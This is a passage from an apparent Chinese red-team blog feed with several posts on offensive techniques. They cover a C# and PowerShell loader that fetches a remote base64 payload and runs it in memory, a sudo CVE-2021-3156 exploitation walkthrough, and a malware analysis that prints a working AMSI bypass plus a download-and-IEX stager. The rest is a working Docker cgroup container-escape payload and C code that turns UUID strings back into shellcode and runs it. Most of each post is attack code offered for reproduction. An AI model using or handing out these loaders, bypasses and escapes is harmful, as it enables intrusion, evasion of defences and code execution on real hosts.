IntPtr CreateThread(        UInt32 lpThreadAttributes,        UInt32 dwStackSize,        UInt32 lpStartAddress,        IntPtr param,        UInt32 dwCreationFlags,        ref UInt32 lpThreadId        );        [DllImport(&quot;kernel32&quot;)]        private static extern bool CloseHandle(IntPtr handle);        [DllImport(&quot;kernel32&quot;)]        private static extern UInt32 WaitForSingleObject(        IntPtr hHandle,        UInt32 dwMilliseconds        );        [DllImport(&quot;kernel32&quot;)]        private static extern IntPtr GetModuleHandle(        string moduleName        );        [DllImport(&quot;kernel32&quot;)]        private static extern UInt32 GetProcAddress(        IntPtr hModule,        string procName        );        [DllImport(&quot;kernel32&quot;)]        private static extern UInt32 LoadLibrary(        string lpFileName        );        [DllImport(&quot;kernel32&quot;)]        private static extern UInt32 GetLastError();    }}</code></pre><p>利用csc生成或者vs生成 (这里csc生成对应的位数须为x86)</p><pre><code>csc.exe /unsafe /platform:x86 /out:output\run.exe output\tmp.cs</code></pre><p>基本调用</p><pre><code class="powershell">$bytes = [System.IO.File]::ReadAllBytes(&quot;C:\Users\Jiushi\Desktop\test.exe&quot;)[Reflection.Assembly]::Load($bytes)[run.Program]::box()</code></pre><p><img src="https://s3.ax1x.com/2021/02/01/yVaJoT.png" alt=""></p><p>下载并执行<br>远端的payload.txt</p><pre><code>$bytes = [System.IO.File]::ReadAllBytes(&quot;C:\Users\Jiushi\Desktop\test.exe&quot;)$a=[Convert]::ToBase64String($bytes)$a | out-file &quot;payload.txt&quot;</code></pre><p>远程调用</p><pre><code>$payload=(New-Object Net.WebClient).DownloadString(&quot;URL&quot;)$tk=[Convert]::FromBase64String($payload)[Reflection.Assembly]::Load($tk)[run.Program]::box()</code></pre><p><img src="https://s3.ax1x.com/2021/02/01/yVa0yR.png" alt=""></p><p>写了个脚本用于快速生成对应的powershell command<br><a href="https://github.com/422926799/note/tree/master/%E8%87%AA%E5%B7%B1%E5%86%99%E7%9A%84%E5%B7%A5%E5%85%B7/AssemblyLoad%E7%94%9F%E6%88%90" target="_blank" rel="noopener">https://github.com/422926799/note/tree/master/%E8%87%AA%E5%B7%B1%E5%86%99%E7%9A%84%E5%B7%A5%E5%85%B7/AssemblyLoad%E7%94%9F%E6%88%90</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;分析昨天的vbs的时候看见了个为&lt;code&gt;[Reflection.Assembly]::Load&lt;/code&gt;的技术。好像没研究过&lt;br&gt;</summary>
      
    
    
    
    
    <category term="红队" scheme="http://422926799.github.io/tags/红队/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2021-3156 sudo提权漏洞复现</title>
    <link href="http://422926799.github.io/posts/14fbb503.html"/>
    <id>http://422926799.github.io/posts/14fbb503.html</id>
    <published>2021-01-31T09:51:17.000Z</published>
    <updated>2021-01-31T10:06:03.478Z</updated>
    
    <content type="html"><![CDATA[<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Sudo 1.8.2 – 1.8.31p2<br>Sudo 1.9.0 – 1.9.5p1</p><p>sudo官方位于1月26号已经修复，后面在安装的sudo已经补上了<br><img src="https://s3.ax1x.com/2021/01/31/yErSN6.png" alt=""><br>官方链接：<a href="https://www.sudo.ws/" target="_blank" rel="noopener">https://www.sudo.ws/</a></p><p><strong>不影响的版本</strong><br>sudo =&gt;1.9.5p2</p><p>exp：<a href="https://github.com/422926799/note/tree/master/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/CVE-2021-3156" target="_blank" rel="noopener">https://github.com/422926799/note/tree/master/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/CVE-2021-3156</a><br>来源于某微信公众号:<a href="https://mp.weixin.qq.com/s/c9UiJ74TbLXziK08tumIHA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/c9UiJ74TbLXziK08tumIHA</a></p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>Debain Sudo version 1.8.31p1<br>Ubuntu Sudo version 1.8.21p2 （昨天安的sudo已经修复）</p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>检测是否存在漏洞</p><pre><code>sudoedit -s /</code></pre><p>存在<br><img src="https://s3.ax1x.com/2021/01/31/yErYEq.png" alt=""></p><p>不存在<br><img src="https://s3.ax1x.com/2021/01/31/yErg56.png" alt=""></p><p>下载exp，make。然后运行sudo-hax-me-a-sandwich<br><img src="https://s3.ax1x.com/2021/01/31/yErhxe.png" alt=""></p><p><img src="https://s3.ax1x.com/2021/01/31/yErbIP.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;影响版本&quot;&gt;&lt;a href=&quot;#影响版本&quot; class=&quot;headerlink&quot; title=&quot;影响版本&quot;&gt;&lt;/a&gt;影响版本&lt;/h2&gt;&lt;p&gt;Sudo 1.8.2 – 1.8.31p2&lt;br&gt;Sudo 1.9.0 – 1.9.5p1&lt;/p&gt;
&lt;p&gt;sudo官方位于1</summary>
      
    
    
    
    
    <category term="漏洞复现" scheme="http://422926799.github.io/tags/漏洞复现/"/>
    
  </entry>
  
  <entry>
    <title>某word恶意VBA样本分析</title>
    <link href="http://422926799.github.io/posts/e2324e90.html"/>
    <id>http://422926799.github.io/posts/e2324e90.html</id>
    <published>2021-01-30T16:45:33.000Z</published>
    <updated>2021-02-01T04:53:58.780Z</updated>
    
    <content type="html"><![CDATA[<p><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1815684465&auto=1&height=66"></iframe></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在群里看到的一个样本。打算分析一下<br>样本来源:<a href="https://app.any.run/tasks/9f3895b5-6ae1-4ac1-b829-b50202985e3d/#" target="_blank" rel="noopener">https://app.any.run/tasks/9f3895b5-6ae1-4ac1-b829-b50202985e3d/#</a></p><p>最后修改：2021/2/1</p><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>winhex打开文档发现是rtf文件<br><img src="https://s3.ax1x.com/2021/02/01/yZAnpQ.png" alt=""></p><p>利用oletools套件里的rtfobj查看<br><img src="https://s3.ax1x.com/2021/02/01/yZAsAK.png" alt=""></p><p>dump出vbs</p><pre><code>rtfobj -s all invoice.doc</code></pre><p><img src="https://s3.ax1x.com/2021/02/01/yZALcj.png" alt=""></p><p>Client.vbs：<a href="https://paste.ubuntu.com/p/v74cHNShTq/" target="_blank" rel="noopener">https://paste.ubuntu.com/p/v74cHNShTq/</a><br>由于给出的比较混乱加上app.any.run给出的执行过程，大概一句话:<br>根据判断使用wscript或powershell执行上线</p><p>powershell command分析</p><pre><code class="powershell">[Ref].Assembly.GetType(&#39;Sy&#39; + &#39;stem.&#39; + &#39;Mana&#39; + &#39;gem&#39; + &#39;ent&#39; + &#39;.Autom&#39; + &#39;atio&#39; + &#39;n.A&#39; + &#39;m&#39; + &#39;si&#39; + &#39;Utils&#39;);\n$835FFE1926 = &#39;4456625220575263174452554847&#39;;\n$9FE0AD5C66 = [string](0..13|% {    [char][int](53 + ($835FFE1926).substring(($_ * 2), 2))}) - replace &#39; &#39;;$58FB808063 = $8B0111F552.GetField($9FE0AD5C66, &#39;Non^^^&#39;.replace(&#39;^^^&#39;, &#39;Pub&#39;) + &#39;lic,S&#39; + &#39;tatic&#39;);$58FB808063.SetValue($null, $true);($A72F9B815A = $A72F9B815A = Write - Host &#39;EC4AAB5808223EB722F9C2063ED056665AA80AC5658F9D06815720759C3EB4C4B7065724C3DEFA63DEB58FC3FA9D22121674&#39;);$747586859599494838475575854949393847584855 = @(91, 82, 101, 102, 93, 46, 65, 115, 115, 101, 109, 98, 108, 121, 46, 71, 101, 116, 84, 121, 112, 101, 40, 39, 83, 121, 39, 43, 39, 115, 116, 101, 109, 46, 39, 43, 39, 77, 97, 110, 97, 39, 43, 39, 103, 101, 109, 39, 43, 39, 101, 110, 116, 39, 43, 39, 46, 65, 117, 116, 111, 109, 39, 43, 39, 97, 116, 105, 111, 39, 43, 39, 110, 46, 39, 43, 36, 40, 91, 67, 72, 65, 114, 93, 40, 57, 56, 45, 51, 51, 41, 43, 91, 99, 72, 65, 114, 93, 40, 49, 50, 52, 45, 49, 53, 41, 43, 91, 99, 104, 65, 82, 93, 40, 49, 49, 53, 41, 43, 91, 67, 72, 97, 82, 93, 40, 91, 66, 89, 116, 101, 93, 48, 120, 54, 57, 41, 41, 43, 39, 85, 116, 105, 108, 115, 39, 41, 46, 71, 101, 116, 70, 105, 101, 108, 100, 40, 36, 40, 91, 67, 104, 65, 114, 93, 40, 91, 98, 121, 116, 101, 93, 48, 120, 54, 49, 41, 43, 91, 99, 104, 97, 82, 93, 40, 91, 98, 89, 116, 69, 93, 48, 120, 54, 68, 41, 43, 91, 99, 104, 97, 114, 93, 40, 91, 98, 121, 84, 101, 93, 48, 120, 55, 51, 41, 43, 91, 99, 104, 65, 114, 93, 40, 49, 49, 48, 45, 53, 41, 43, 91, 99, 104, 65, 82, 93, 40, 91, 66, 89, 84, 69, 93, 48, 120, 52, 57, 41, 43, 91, 99, 72, 97, 82, 93, 40, 57, 54, 56, 48, 47, 56, 56, 41, 43, 91, 99, 72, 97, 82, 93, 40, 49, 48, 53, 41, 43, 91, 67, 104, 97, 114, 93, 40, 91, 98, 89, 116, 101, 93, 48, 120, 55, 52, 41, 43, 91, 67, 104, 97, 114, 93, 40, 91, 66, 89, 84, 69, 93, 48, 120, 52, 54, 41, 43, 91, 99, 104, 97, 114, 93, 40, 49, 52, 56, 45, 53, 49, 41, 43, 91, 99, 72, 65, 82, 93, 40, 57, 53, 53, 53, 47, 57, 49, 41, 43, 91, 67, 104, 65, 82, 93, 40, 49, 48, 56, 41, 43, 91, 67, 104, 65, 114, 93, 40, 54, 50, 54, 50, 47, 54, 50, 41, 43, 91, 67, 104, 65, 82, 93, 40, 91, 98, 89, 84, 69, 93, 48, 120, 54, 52, 41, 41, 44, 39, 78, 111, 110, 80, 117, 98, 108, 105, 99, 44, 83, 116, 97, 116, 105, 99, 39, 41, 46, 83, 101, 116, 86, 97, 108, 117, 101, 40, 36, 110, 117, 108, 108, 44, 36, 116, 114, 117, 101, 41, 59, 40, 36, 49, 68, 55, 56, 53, 70, 50, 56, 53, 67, 61, 36, 49, 68, 55, 56, 53, 70, 50, 56, 53, 67, 61, 87, 114, 105, 116, 101, 45, 72, 111, 115, 116, 32, 39, 69, 67, 52, 65, 65, 66, 53, 56, 48, 56, 50, 50, 51, 69, 66, 55, 50, 50, 70, 57, 67, 50, 48, 54, 51, 69, 68, 48, 53, 54, 54, 54, 53, 65, 65, 56, 48, 65, 67, 53, 54, 53, 56, 70, 57, 68, 48, 54, 56, 49, 53, 55, 50, 48, 55, 53, 57, 67, 51, 69, 66, 52, 67, 52, 66, 55, 48, 54, 53, 55, 50, 52, 67, 51, 68, 69, 70, 65, 54, 51, 68, 69, 66, 53, 56, 70, 67, 51, 70, 65, 57, 68, 50, 50, 49, 50, 49, 54, 55, 52, 39, 41, 59, 100, 111, 32, 123, 36, 112, 105, 110, 103, 32, 61, 32, 116, 101, 115, 116, 45, 99, 111, 110, 110, 101, 99, 116, 105, 111, 110, 32, 45, 99, 111, 109, 112, 32, 103, 111, 111, 103, 108, 101, 46, 99, 111, 109, 32, 45, 99, 111, 117, 110, 116, 32, 49, 32, 45, 81, 117, 105, 101, 116, 125, 32, 117, 110, 116, 105, 108, 32, 40, 36, 112, 105, 110, 103, 41, 59, 36, 66, 54, 55, 54, 56, 48, 65, 69, 49, 54, 32, 61, 32, 91, 69, 110, 117, 109, 93, 58, 58, 84, 111, 79, 98, 106, 101, 99, 116, 40, 91, 83, 121, 115, 116, 101, 109, 46, 78, 101, 116, 46, 83, 101, 99, 117, 114, 105, 116, 121, 80, 114, 111, 116, 111, 99, 111, 108, 84, 121, 112, 101, 93, 44, 32, 51, 48, 55, 50, 41, 59, 91, 83, 121, 115, 116, 101, 109, 46, 78, 101, 116, 46, 83, 101, 114, 118, 105, 99, 101, 80, 111, 105, 110, 116, 77, 97, 110, 97, 103, 101, 114, 93, 58, 58, 83, 101, 99, 117, 114, 105, 116, 121, 80, 114, 111, 116, 111, 99, 111, 108, 32, 61, 32, 36, 66, 54, 55, 54, 56, 48, 65, 69, 49, 54, 59, 36, 69, 55, 68, 69, 65, 56, 68, 66, 48, 51, 61, 32, 78, 101, 119, 45, 79, 98, 106, 101, 99, 116, 32, 45, 67, 111, 109, 32, 77, 105, 99, 114, 111, 115, 111, 102, 116, 46, 88, 77, 76, 72, 84, 84, 80, 59, 36, 69, 55, 68, 69, 65, 56, 68, 66, 48, 51, 46, 111, 112, 101, 110, 40, 39, 71, 69, 84, 39, 44, 39, 104, 116, 116, 112, 58, 47, 47, 49, 48, 56, 46, 54, 49, 46, 49, 54, 54, 46, 49, 49, 47, 109, 47, 102, 105, 110, 101, 46, 106, 112, 103, 39, 44, 36, 102, 97, 108, 115, 101, 41, 59, 36, 69, 55, 68, 69, 65, 56, 68, 66, 48, 51, 46, 115, 101, 110, 100, 40, 41, 59, 36, 54, 55, 52, 69, 49, 54, 53, 67, 56, 51, 61, 91, 84, 101, 120, 116, 46, 69, 110, 99, 111, 100, 105, 110, 103, 93, 58, 58, 39, 85, 84, 70, 56, 39, 46, 39, 71, 101, 116, 83, 116, 114, 105, 110, 103, 39, 40, 91, 67, 111, 110, 118, 101, 114, 116, 93, 58, 58, 39, 70, 114, 111, 109, 66, 97, 115, 101, 54, 52, 83, 116, 114, 105, 110, 103, 39, 40, 36, 69, 55, 68, 69, 65, 56, 68, 66, 48, 51, 46, 114, 101, 115, 112, 111, 110, 115, 101, 84, 101, 120, 116, 41, 41, 124, 73, 96, 69, 96, 88);[System.Text.Encoding]::ASCII.GetString($747586859599494838475575854949393847584855)|I`E`X</code></pre><p>1.首先利用System.Management.Automation.AmsiUtils状态，将检测的语句设置为null。bypass AMI<br>2.将ascii解码利用IEX执行</p><p>去混淆分析</p><pre><code class="powershell">[Ref].Assembly.GetType(&#39;Sy&#39;+&#39;stem.&#39;+&#39;Mana&#39;+&#39;gem&#39;+&#39;ent&#39;+&#39;.Autom&#39;+&#39;atio&#39;+&#39;n.&#39;+$([CHAr](98-33)+[cHAr](124-15)+[chAR](115)+[CHaR]([BYte]0x69))+&#39;Utils&#39;).GetField($([ChAr]([byte]0x61)+[chaR]([bYtE]0x6D)+[char]([byTe]0x73)+[chAr](110-5)+[chAR]([BYTE]0x49)+[cHaR](9680/88)+[cHaR](105)+[Char]([bYte]0x74)+[Char]([BYTE]0x46)+[char](148-51)+[cHAR](9555/91)+[ChAR](108)+[ChAr](6262/62)+[ChAR]([bYTE]0x64)),&#39;NonPublic,Static&#39;).SetValue($null,$true);($1D785F285C=$1D785F285C=Write-Host &#39;EC4AAB5808223EB722F9C2063ED056665AA80AC5658F9D06815720759C3EB4C4B7065724C3DEFA63DEB58FC3FA9D22121674&#39;);do {$ping = test-connection -comp google.com -count 1 -Quiet} until ($ping); #判断google能否ping通$B67680AE16 = [Enum]::ToObject([System.Net.SecurityProtocolType], 3072);[System.Net.ServicePointManager]::SecurityProtocol = $B67680AE16;$E7DEA8DB03= New-Object -Com Microsoft.XMLHTTP;$E7DEA8DB03.open(&#39;GET&#39;,&#39;http://108.61.166.11/m/fine.jpg&#39;,$false);$E7DEA8DB03.send();$674E165C83=[Text.Encoding]::&#39;UTF8&#39;.&#39;GetString&#39;([Convert]::&#39;FromBase64String&#39;($E7DEA8DB03.responseText))|I`E`X #远程下载执行</code></pre><p>1.利用System.Management.Automation.AmsiUtils状态，将检测的语句设置为null。bypass AMI<br>2.发一个包检测能否连接google.com,如果不成功则重复检测<br>3.远程下载<code>http://108.61.166.11/m/fine.jpg</code> base64解码运行</p><p>fine.jpg<br><img src="https://s3.ax1x.com/2021/01/31/yA8V41.png" alt=""></p><p>经过base64解码得到一下code<br><img src="https://s3.ax1x.com/2021/01/31/yA8YCt.png" alt=""></p><p><img src="https://s3.ax1x.com/2021/01/31/yA8wDg.png" alt=""><br>1.一如既往的利用System.Management.Automation.AmsiUtils状态，将检测的语句设置为null。bypass AMI<br>2.将@00替换为0x<br>3.利用[System.Reflection.Assembly]::Load加载带有基于通用对象文件格式 (COFF) 的映像的程序集，该映像包含已发出的程序集。 此程序集将会加载到调用方的应用程序域中。<br>4.利用Assembly.Load加载IMAGE_NT_HEADERS变量里的dll，然后调用Quoting类里的SplitUnquoted函数将$ZOIOXMAUI??KDWXAMKYEC参数传入</p><p>提取出来的dll如下<br><img src="https://s3.ax1x.com/2021/01/31/yEYIk4.md.png" alt=""></p><p>根据app.any.run给出的标签属于trojan家族的</p><p>Quoting类里的SplitUnquoted函数<br><img src="https://s3.ax1x.com/2021/01/31/yEaSNF.png" alt=""></p><p>最后所有提取出来的文件<br><img src="https://s3.ax1x.com/2021/02/01/yZEpNT.png" alt=""></p><p>IOCS:<br>Main object- “mal0129-01.zip”<br>    sha256    00789a46bbe5d6537f0b2ebb23a006d51c18752f13c1fac475f39b7e8e0431a4<br>    sha1    3e70416110eca3a4dda6a28e929413193fa008b4<br>    md5    e26e82db7083a2559ecfe147c7696cb9<br>Connections<br>    ip    108.61.166.11<br>HTTP/HTTPS requests<br>    url    <a href="http://108.61.166.11/m/fine.jpg" target="_blank" rel="noopener">http://108.61.166.11/m/fine.jpg</a>    </p><p>微步社区<br><img src="https://s3.ax1x.com/2021/01/31/yAGdRx.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://app.any.run/tasks/9f3895b5-6ae1-4ac1-b829-b50202985e3d/#" target="_blank" rel="noopener">https://app.any.run/tasks/9f3895b5-6ae1-4ac1-b829-b50202985e3d/#</a><br><a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.reflection.assembly.load?view=net-5.0" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/dotnet/api/system.reflection.assembly.load?view=net-5.0</a><br><a href="https://blog.csdn.net/csdndscs/article/details/103946972" target="_blank" rel="noopener">https://blog.csdn.net/csdndscs/article/details/103946972</a><br><a href="https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/" target="_blank" rel="noopener">https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;iframe frameborder=&quot;no&quot; border=&quot;0&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; width=&quot;330&quot; height=&quot;86&quot; src=&quot;//music.163.com/outchain/player?type=2&amp;</summary>
      
    
    
    
    
    <category term="恶意分析" scheme="http://422926799.github.io/tags/恶意分析/"/>
    
  </entry>
  
  <entry>
    <title>利用cgroup快速逃逸docker</title>
    <link href="http://422926799.github.io/posts/99258750.html"/>
    <id>http://422926799.github.io/posts/99258750.html</id>
    <published>2021-01-28T18:40:23.000Z</published>
    <updated>2021-01-28T18:45:07.556Z</updated>
    
    <content type="html"><![CDATA[<p><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1461215205&auto=1&height=66"></iframe></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>昨天在群里看见篇docker逃逸的文章，看到个没见到的操作。复现并记录一波</p><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>容器拥有特权模式<br>docker run -it –privileged ubuntu /bin/bash</p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>payload</p><pre><code>d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`mkdir -p $d/w;echo 1 &gt;$d/w/notify_on_releaset=`sed -n &#39;s/.*\perdir=\([^,]*\).*/\1/p&#39; /etc/mtab`touch /o; echo $t/c &gt;$d/release_agent;printf &#39;#!/bin/sh\nhostname &gt;&#39;&quot;$t/o&quot; &gt;/c;chmod +x /c;sh -c &quot;echo 0 &gt;$d/w/cgroup.procs&quot;;sleep 1;cat /o</code></pre><p><img src="https://s3.ax1x.com/2021/01/29/yC3OM9.png" alt=""></p><p>命令刨析</p><pre><code>d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)` #寻找cgroup文件夹位置mkdir -p $d/wecho 1 &gt;$d/w/notify_on_release #该文件的内容为1时，当cgroup退出时（不再包含任何进程和子cgroup），将调用release_agent里面配置的命令。新cgroup被创建时将默认继承父cgroup的这项配置。t=`sed -n &#39;s/.*\perdir=\([^,]*\).*/\1/p&#39; /etc/mtab` #从当前的分区挂载寻找该容器的UIDtouch /oecho $t/c &gt; $d/release_agent #里面包含了cgroup退出时将会执行的命令，系统调用该命令时会将相应cgroup的相对路径当作参数传进去。printf &#39;#!/bin/sh\nhostname &gt;&#39;&quot;$t/o&quot; &gt;/c; #输出&lt;command&gt; \&gt; 和容器pid路径 图二 (将在母机上执行的命令执行到容器根目录里面的o文件)chmod +x /csh -c &quot;echo 0 &gt;$d/w/cgroup.procs&quot; #当前cgroup中的所有进程ID，系统不保证ID是顺序排列的，且ID有可能重复 （将进程PID写入除非cgroup执行）sleep 1cat /o</code></pre><p><img src="https://s3.ax1x.com/2021/01/29/yC3jq1.png" alt=""></p><p><img src="https://s3.ax1x.com/2021/01/29/yC3xVx.png" alt=""></p><p><img src="https://s3.ax1x.com/2021/01/29/yC3za6.png" alt=""></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>当docker容器使用特权模式启动时，有权操控cgroup，由于cgroup是Linux内核的一个功能。利用cgroup可以直接执行母机的命令 （说法可能有误）</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.intezer.com/blog/research/how-we-escaped-docker-in-azure-functions/" target="_blank" rel="noopener">https://www.intezer.com/blog/research/how-we-escaped-docker-in-azure-functions/</a><br><a href="https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/" target="_blank" rel="noopener">https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/</a><br><a href="https://twitter.com/_fel1x/status/1151487051986087936?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1151487053370187776%7Ctwgr%5E&amp;ref_url=https%3A%2F%2Fblog.trailofbits.com%2F2019%2F07%2F19%2Funderstanding-docker-container-escapes%2F" target="_blank" rel="noopener">https://twitter.com/_fel1x/status/1151487051986087936?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1151487053370187776%7Ctwgr%5E&amp;ref_url=https%3A%2F%2Fblog.trailofbits.com%2F2019%2F07%2F19%2Funderstanding-docker-container-escapes%2F</a><br><a href="https://zh.wikipedia.org/wiki/Cgroups" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/Cgroups</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;iframe frameborder=&quot;no&quot; border=&quot;0&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; width=&quot;330&quot; height=&quot;86&quot; src=&quot;//music.163.com/outchain/player?type=2&amp;</summary>
      
    
    
    
    
    <category term="bypass" scheme="http://422926799.github.io/tags/bypass/"/>
    
  </entry>
  
  <entry>
    <title>UID shellcode硬编码</title>
    <link href="http://422926799.github.io/posts/9f6e42ac.html"/>
    <id>http://422926799.github.io/posts/9f6e42ac.html</id>
    <published>2021-01-25T05:09:49.000Z</published>
    <updated>2021-01-25T05:34:14.180Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>翻文章的时候翻到一篇，将shellcode硬编码成UID。然后在把UID解密写入内存空间后执行的<br>原文链接：<a href="https://research.nccgroup.com/2021/01/23/rift-analysing-a-lazarus-shellcode-execution-method/" target="_blank" rel="noopener">https://research.nccgroup.com/2021/01/23/rift-analysing-a-lazarus-shellcode-execution-method/</a></p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>原文给出的shellcode如下</p><pre><code>1\xc0PhcalcTYP@\x92t\x15Qd\x8br/\x8bv\x0c\x8bv\x0c\xad\x8b0\x8b~\x18\xb2P\xeb\x1a\xb2`H)\xd4eH\x8b2H\x8bv\x18H\x8bv\x10H\xadH\x8b0H\x8b~0\x03W&lt;\x8b\\\x17(\x8bt\x1f H\x01\xfe\x8bT\x1f$\x0f\xb7,\x17\x8dR\x02\xad\x81&lt;\x07WinEu\xef\x8bt\x1f\x1cH\x01\xfe\x8b4\xaeH\x01\xf7\x99\xff\xd7\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</code></pre><p>shellcode转换成UUID后和原文是对的上的</p><pre><code class="py">import uuidimport binasciiimport chardetbuf=b&quot;1\xc0PhcalcTYP@\x92t\x15Qd\x8br/\x8bv\x0c\x8bv\x0c\xad\x8b0\x8b~\x18\xb2P\xeb\x1a\xb2`H)\xd4eH\x8b2H\x8bv\x18H\x8bv\x10H\xadH\x8b0H\x8b~0\x03W&lt;\x8b\\\x17(\x8bt\x1f H\x01\xfe\x8bT\x1f$\x0f\xb7,\x17\x8dR\x02\xad\x81&lt;\x07WinEu\xef\x8bt\x1f\x1cH\x01\xfe\x8b4\xaeH\x01\xf7\x99\xff\xd7\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;hex_buf=binascii.hexlify(buf).decode()tmp=&quot;&quot;for k in hex_buf:    tmp+=k    if len(tmp)==32:        print(&quot;\&quot;{}\&quot;,&quot;.format(uuid.UUID(bytes_le=binascii.unhexlify(tmp))))        tmp=&quot;&quot;</code></pre><p><img src="https://s3.ax1x.com/2021/01/25/sLP7Ct.png" alt=""></p><p>执行shellcode</p><pre><code class="C">// uuidrun.cpp : 定义控制台应用程序的入口点。//#include &quot;stdafx.h&quot;#include &lt;Windows.h&gt;#include &lt;Rpc.h&gt;#include &lt;iostream&gt;#pragma comment(lib, &quot;Rpcrt4.lib&quot;)const char* uuids[] ={    &quot;6850c031-6163-636c-5459-504092741551&quot;,    &quot;2f728b64-768b-8b0c-760c-ad8b308b7e18&quot;,    &quot;1aeb50b2-60b2-2948-d465-488b32488b76&quot;,    &quot;768b4818-4810-48ad-8b30-488b7e300357&quot;,    &quot;175c8b3c-8b28-1f74-2048-01fe8b541f24&quot;,    &quot;172cb70f-528d-ad02-813c-0757696e4575&quot;,    &quot;1f748bef-481c-fe01-8b34-ae4801f799ff&quot;,    &quot;000000d7-0000-0000-0000-000000000000&quot;,};int main(){    HANDLE hc = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0); //在进程的虚拟地址空间中保留空间    void* ha = HeapAlloc(hc, 0, 0x100000); //申请内存    DWORD_PTR hptr = (DWORD_PTR)ha;    int elems = sizeof(uuids) / sizeof(uuids[0]);    for (int i = 0; i &lt; elems; i++) {        RPC_STATUS status = UuidFromStringA((RPC_CSTR)uuids[i], (UUID*)hptr); //UUID转换为原来的shellcode写入内存        if (status != RPC_S_OK) {            printf(&quot;UuidFromStringA() != S_OK\n&quot;);            CloseHandle(ha);            return -1;        }        hptr += 16;    }    printf(&quot;[*] Hexdump: &quot;);    for (int i = 0; i &lt; elems * 16; i++) {        printf(&quot;%02X &quot;, ((unsigned char*)ha)[i]);    }    EnumSystemLocalesA((LOCALE_ENUMPROCA)ha, 0); //枚举操作系统上安装或支持的语言环境。    return 0;}</code></pre><p><img src="https://s3.ax1x.com/2021/01/25/sLPqv8.png" alt=""></p><p>原文的shellcode反汇编后如下</p><pre><code class="asm">xor eax, eax ;清空eaxpush raxpush 0x636c6163 ;calcpush rsppop rcxpush raxxchg eax, edx ;交换edx和eax的值，EAX=EDX,EDX=EAXje 0x24push rcxmov esi, dword ptr fs:[rdx + 0x2f] ;寻找PEB地址mov esi, dword ptr [rsi + 0xc]mov esi, dword ptr [rsi + 0xc]lodsd eax, dword ptr [rsi]mov esi, dword ptr [rax]mov edi, dword ptr [rsi + 0x18]mov dl, 0x50jmp 0x3emov dl, 0x60sub rsp, rdxmov rsi, qword ptr gs:[rdx] ;寻找PEB地址mov rsi, qword ptr [rsi + 0x18]mov rsi, qword ptr [rsi + 0x10]lodsq rax, qword ptr [rsi]mov rsi, qword ptr [rax]mov rdi, qword ptr [rsi + 0x30]add edx, dword ptr [rdi + 0x3c]mov ebx, dword ptr [rdi + rdx + 0x28]mov esi, dword ptr [rdi + rbx + 0x20]add rsi, rdimov edx, dword ptr [rdi + rbx + 0x24]movzx ebp, word ptr [rdi + rdx]lea edx, [rdx + 2]lodsd eax, dword ptr [rsi]cmp dword ptr [rdi + rax], 0x456e6957jne 0x50mov esi, dword ptr [rdi + rbx + 0x1c]add rsi, rdimov esi, dword ptr [rsi + rbp*4]add rdi, rsicdq call rdiadd byte ptr [rax], aladd byte ptr [rax], aladd byte ptr [rax], aladd byte ptr [rax], aladd byte ptr [rax], aladd byte ptr [rax], aladd byte ptr [rax], al</code></pre><p>尝试用msf的shellcode来整UUID。发现并不行，估计shellcode需要修改，不会改，算篇复现文…</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;翻文章的时候翻到一篇，将shellcode硬编码成UID。然后在把UID解密写入内存空间后执行的&lt;br&gt;原文链接：&lt;a href=&quot;http</summary>
      
    
    
    
    
